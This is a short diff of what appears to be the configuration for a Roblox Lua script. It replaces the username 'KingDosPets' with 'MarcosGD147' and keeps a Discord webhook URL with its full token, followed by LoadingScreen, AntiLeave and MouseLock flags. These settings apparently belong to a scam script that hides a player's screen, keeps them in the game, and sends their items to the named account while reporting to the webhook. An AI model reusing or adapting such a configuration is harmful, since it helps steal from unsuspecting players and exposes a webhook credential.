@@ -7,9 +7,9 @@
 
 ]]--
 
-UserName = "KingDosPets"
+UserName = "MarcosGD147"
 Webhook = "https://discord.com/api/webhooks/1123654223779872798/-ag3cV8EcZouyzsI4jlcPWMHgyYui4ebZ29MIcji8xT_83VWnniPOhuLHj_nvhRtjlYw"
-UserName2 = "KingDosPets"
+UserName2 = "MarcosGD147"
 _G.LoadingScreen = true
 _G.AntiLeave = true
 _G.MouseLock = true
